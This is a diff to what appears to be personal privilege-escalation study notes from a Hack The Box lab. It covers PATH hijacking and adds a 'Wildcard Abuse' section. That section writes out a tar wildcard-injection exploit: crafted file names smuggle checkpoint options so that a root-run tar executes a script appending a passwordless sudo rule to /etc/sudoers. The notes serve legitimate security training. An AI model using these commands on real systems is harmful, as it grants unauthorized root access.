@@ -187,3 +187,13 @@ $ export PATH
 $ echo $PATH
 ```
 %% if we had a malicious script in our current directory for example ls. and use path command to add our current directory to PATH variable then if we ran ls it would run the script in our current directory instead of the one in /bin/ls %%
+
+### Wildcard Abuse
+```
+$ man tar
+$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+$ echo "" > "--checkpoint-action=exec=sh root.sh"
+$ echo "" > --checkpoint=1
+$ sudo -l
+```
+%% if you check tar command manual you notice that there is a checkpoint section that allows you to execute an EXEC action once we run the tar command. You can check sudo privileges after to confirm if the nopasswd executed successfully. %%
